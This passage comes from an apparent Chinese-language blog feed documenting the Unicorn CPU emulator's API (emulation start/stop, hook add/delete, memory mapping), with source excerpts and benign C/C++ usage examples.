如果不需要计数，则移除计数挂钩hook</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt;= <span class="number">0</span> &amp;&amp; uc-&gt;count_hook != <span class="number">0</span>) &#123;</span><br><span class="line">        uc_hook_del(uc, uc-&gt;count_hook);</span><br><span class="line">        uc-&gt;count_hook = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置计数hook记录指令数</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span> &amp;&amp; uc-&gt;count_hook == <span class="number">0</span>) &#123;</span><br><span class="line">        uc_err err;</span><br><span class="line">        <span class="comment">// 对计数指令的回调必须在所有其他操作之前运行，因此必须在hook列表的开头插入hook，而不是附加hook</span></span><br><span class="line">        uc-&gt;hook_insert = <span class="number">1</span>;</span><br><span class="line">        err = uc_hook_add(uc, &amp;uc-&gt;count_hook, UC_HOOK_CODE, hook_count_cb, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 恢复到 uc_hook_add()</span></span><br><span class="line">        uc-&gt;hook_insert = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc-&gt;addr_end = until;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout)</span><br><span class="line">        enable_emu_timer(uc, timeout * <span class="number">1000</span>);   <span class="comment">// microseconds -&gt; nanoseconds</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;vm_start(uc)) &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_RESOURCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 模拟完成</span></span><br><span class="line">    uc-&gt;emulation_done = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (timeout) &#123;</span><br><span class="line">        <span class="comment">// 等待超时</span></span><br><span class="line">        qemu_thread_join(&amp;uc-&gt;timer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(uc-&gt;timed_out)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_TIMEOUT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> uc-&gt;invalid_error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x33\xC0"</span> <span class="comment">// xor  eax, eax</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDRESS 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line">    uc_err err;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> r_eax = <span class="number">0x111</span>;</span><br><span class="line">    </span><br><span class="line">    err = uc_open(UC_ARCH_X86, UC_MODE_32, &amp;uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_open() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;   </span><br><span class="line">    </span><br><span class="line">    uc_mem_map(uc, ADDRESS, <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>, UC_PROT_ALL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc_mem_write(uc, ADDRESS, X86_CODE32, <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed to write emulation code to memory, quit!\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_reg_write(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; before EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    err = uc_emu_start(uc, ADDRESS, ADDRESS + <span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_emu_start() with error returned %u: %s\n"</span>,</span><br><span class="line">        err, uc_strerror(err));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uc_reg_read(uc, UC_X86_REG_EAX, &amp;r_eax);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; after EAX = 0x%x\n"</span>, r_eax);</span><br><span class="line"></span><br><span class="line">    err = uc_close(uc);</span><br><span class="line">    <span class="keyword">if</span> (err != UC_ERR_OK) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Failed on uc_close() with error returned: %u\n"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/19/K4HMijIVt6lofvT.png" alt="image.png"></p><h3 id="uc-emu-stop"><a href="#uc-emu-stop" class="headerlink" title="uc_emu_stop"></a>uc_emu_stop</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_stop</span><span class="params">(uc_engine *uc)</span></span>;</span><br></pre></td></tr></table></figure><p>停止模拟</p><p>通常是从通过 tracing API注册的回调函数中调用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_emu_stop</span><span class="params">(uc_engine *uc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;emulation_done)</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line"></span><br><span class="line">    uc-&gt;stop_request = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;current_cpu) &#123;</span><br><span class="line">        <span class="comment">// 退出当前线程</span></span><br><span class="line">        cpu_exit(uc-&gt;current_cpu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">uc_emu_stop(uc);</span><br></pre></td></tr></table></figure><p>From <a href="https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(三">https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(三)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例-三&quot;&gt;&lt;a href=&quot;#Unicorn-CPU模拟框架数据类型及API分析与示例-三&quot; class=&quot;headerlink&quot; title=&quot;Unicorn-CPU模拟框架数据类型及API分析与示例(三)&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Unicorn-CPU模拟框架数据类型及API分析与示例(四)</title>
    <link href="https://kabeor.github.io/Unicorn-CPU%E6%A8%A1%E6%8B%9F%E6%A1%86%E6%9E%B6%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E4%B8%8E%E7%A4%BA%E4%BE%8B(%E5%9B%9B)/"/>
    <id>https://kabeor.github.io/Unicorn-CPU模拟框架数据类型及API分析与示例(四)/</id>
    <published>2020-02-13T05:51:24.768Z</published>
    <updated>2020-02-13T05:55:58.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Unicorn-CPU模拟框架数据类型及API分析与示例-四"><a href="#Unicorn-CPU模拟框架数据类型及API分析与示例-四" class="headerlink" title="Unicorn-CPU模拟框架数据类型及API分析与示例(四)"></a>Unicorn-CPU模拟框架数据类型及API分析与示例(四)</h1><h2 id="0x2-API分析"><a href="#0x2-API分析" class="headerlink" title="0x2 API分析"></a>0x2 API分析</h2><h3 id="uc-hook-add"><a href="#uc-hook-add" class="headerlink" title="uc_hook_add"></a>uc_hook_add</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="keyword">int</span> type, <span class="keyword">void</span> *callback,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span> *user_data, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> end, ...)</span></span>;</span><br></pre></td></tr></table></figure><p>注册hook事件的回调，当hook事件被触发将会进行回调。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@hh: 注册hook得到的句柄. uc_hook_del() 中使用</span><br><span class="line">@type: hook 类型</span><br><span class="line">@callback: 当指令被命中时要运行的回调</span><br><span class="line">@user_data: 用户自定义数据. 将被传递给回调函数的最后一个参数 @user_data</span><br><span class="line">@begin: 回调生效区域的起始地址(包括)</span><br><span class="line">@end: 回调生效区域的结束地址(包括)</span><br><span class="line">  注意 1: 只有回调的地址在[@begin, @end]中才会调用回调</span><br><span class="line">  注意 2: 如果 @begin &gt; @end, 每当触发此hook类型时都会调用回调</span><br><span class="line">@...: 变量参数 (取决于 @type)</span><br><span class="line">  注意: 如果 @type = UC_HOOK_INSN, 这里是指令ID (如: UC_X86_INS_OUT)</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="keyword">int</span> type, <span class="keyword">void</span> *callback,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span> *user_data, <span class="keyword">uint64_t</span> begin, <span class="keyword">uint64_t</span> end, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = UC_ERR_OK;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span> = <span class="title">calloc</span>(1, <span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">hook</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (hook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hook-&gt;begin = begin;</span><br><span class="line">    hook-&gt;end = end;</span><br><span class="line">    hook-&gt;type = type;</span><br><span class="line">    hook-&gt;callback = callback;</span><br><span class="line">    hook-&gt;user_data = user_data;</span><br><span class="line">    hook-&gt;refs = <span class="number">0</span>;</span><br><span class="line">    *hh = (uc_hook)hook;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// UC_HOOK_INSN 有一个额外参数：指令ID</span></span><br><span class="line">    <span class="keyword">if</span> (type &amp; UC_HOOK_INSN) &#123;</span><br><span class="line">        va_list valist;</span><br><span class="line"></span><br><span class="line">        va_start(valist, end);</span><br><span class="line">        hook-&gt;insn = va_arg(valist, <span class="keyword">int</span>);</span><br><span class="line">        va_end(valist);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;insn_hook_validate) &#123;</span><br><span class="line">            <span class="keyword">if</span> (! uc-&gt;insn_hook_validate(hook-&gt;insn)) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_HOOK;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (uc-&gt;hook_insert) &#123;</span><br><span class="line">            <span class="keyword">if</span> (list_insert(&amp;uc-&gt;hook[UC_HOOK_INSN_IDX], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (list_append(&amp;uc-&gt;hook[UC_HOOK_INSN_IDX], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hook-&gt;refs++;</span><br><span class="line">        <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((type &gt;&gt; i) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((type &gt;&gt; i) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; UC_HOOK_MAX) &#123;</span><br><span class="line">                <span class="keyword">if</span> (uc-&gt;hook_insert) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list_insert(&amp;uc-&gt;hook[i], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">free</span>(hook);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (list_append(&amp;uc-&gt;hook[i], hook) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">free</span>(hook);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">return</span> UC_ERR_NOMEM;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                hook-&gt;refs++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">free</span>(hook);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"unicorn/unicorn.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> syscall_abi[] = &#123;</span><br><span class="line">    UC_X86_REG_RAX, UC_X86_REG_RDI, UC_X86_REG_RSI, UC_X86_REG_RDX,</span><br><span class="line">    UC_X86_REG_R10, UC_X86_REG_R8, UC_X86_REG_R9</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> vals[<span class="number">7</span>] = &#123; <span class="number">200</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* ptrs[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">uc_perror</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* func, uc_err err)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error in %s(): %s\n"</span>, func, uc_strerror(err));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BASE 0x10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// mov rax, 100; mov rdi, 1; mov rsi, 2; mov rdx, 3; mov r10, 4; mov r8, 5; mov r9, 6; syscall</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x48\xc7\xc0\x64\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\xc7\xc6\x02\x00\x00\x00\x48\xc7\xc2\x03\x00\x00\x00\x49\xc7\xc2\x04\x00\x00\x00\x49\xc7\xc0\x05\x00\x00\x00\x49\xc7\xc1\x06\x00\x00\x00\x0f\x05"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_syscall</span><span class="params">(uc_engine* uc, <span class="keyword">void</span>* user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"syscall: &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> size, <span class="keyword">void</span>* user_data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"HOOK_CODE: 0x%"</span> PRIx64 <span class="string">", 0x%x\n"</span>, addr, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    uc_hook sys_hook;</span><br><span class="line">    uc_err err;</span><br><span class="line">    uc_engine* uc;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        ptrs[i] = &amp;vals[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &amp;uc))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_open"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_write_batch(&#123;200, 10, 11, 12, 13, 14, 15&#125;)\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_write_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_write_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(vals, <span class="number">0</span>, <span class="keyword">sizeof</span>(vals));</span><br><span class="line">    <span class="keyword">if</span> ((err = uc_reg_read_batch(uc, syscall_abi, ptrs, <span class="number">7</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_reg_read_batch"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"reg_read_batch = &#123;"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i != <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">", "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%"</span> PRIu64, vals[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// syscall</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"running syscall shellcode\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_hook_add(uc, &amp;sys_hook, UC_HOOK_CODE, hook_syscall, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_hook_add"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_map(uc, BASE, <span class="number">0x1000</span>, UC_PROT_ALL))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_map"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_mem_write(uc, BASE, CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_mem_write"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((err = uc_emu_start(uc, BASE, BASE + <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">        uc_perror(<span class="string">"uc_emu_start"</span>, err);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><p><img src="https://i.loli.net/2020/01/20/aU1lbmxMjXA5g3K.png" alt="image.png"></p><p>对每条指令都进行hook</p><h3 id="uc-hook-del"><a href="#uc-hook-del" class="headerlink" title="uc_hook_del"></a>uc_hook_del</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uc_err uc_hook_del(uc_engine *uc, uc_hook hh);</span><br></pre></td></tr></table></figure><p>删除一个已注册的hook事件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@hh: uc_hook_add() 返回的句柄</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_hook_del</span><span class="params">(uc_engine *uc, uc_hook hh)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">hook</span> *<span class="title">hook</span> = (<span class="title">struct</span> <span class="title">hook</span> *)<span class="title">hh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; UC_HOOK_MAX; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (list_remove(&amp;uc-&gt;hook[i], (<span class="keyword">void</span> *)hook)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (--hook-&gt;refs == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">free</span>(hook);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> UC_ERR_OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((err = uc_hook_add(uc, &amp;sys_hook, UC_HOOK_CODE, hook_syscall, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_hook_add"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((err = uc_hook_del(uc, &amp;sys_hook))) &#123;</span><br><span class="line">    uc_perror(<span class="string">"uc_hook_del"</span>, err);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="uc-mem-map"><a href="#uc-mem-map" class="headerlink" title="uc_mem_map"></a>uc_mem_map</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms)</span></span>;</span><br></pre></td></tr></table></figure><p>为模拟映射一块内存。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 要映射到的新内存区域的起始地址。这个地址必须与4KB对齐，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@size: 要映射到的新内存区域的大小。这个大小必须是4KB的倍数，否则将返回UC_ERR_ARG错误。</span><br><span class="line">@perms: 新映射区域的权限。参数必须是UC_PROT_READ | UC_PROT_WRITE | UC_PROT_EXEC或这些的组合，否则返回UC_ERR_ARG错误。</span><br><span class="line"></span><br><span class="line">@return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span><br></pre></td></tr></table></figure><p>源码实现</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    uc_err res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (uc-&gt;mem_redirect) &#123;</span><br><span class="line">        address = uc-&gt;mem_redirect(address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res = mem_map_check(uc, address, size, perms);    <span class="comment">//内存安全检查</span></span><br><span class="line">    <span class="keyword">if</span> (res)</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> mem_map(uc, address, size, perms, uc-&gt;memory_map(uc, address, size, perms));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用示例同uc_hook_add。</p><h3 id="uc-mem-map-ptr"><a href="#uc-mem-map-ptr" class="headerlink" title="uc_mem_map_ptr"></a>uc_mem_map_ptr</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">uc_err <span class="title">uc_mem_map_ptr</span><span class="params">(uc_engine *uc, <span class="keyword">uint64_t</span> address, <span class="keyword">size_t</span> size, <span class="keyword">uint32_t</span> perms, <span class="keyword">void</span> *ptr)</span></span>;</span><br></pre></td></tr></table></figure><p>在模拟中映射现有的主机内存。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@uc: uc_open() 返回的句柄</span><br><span class="line">@address: 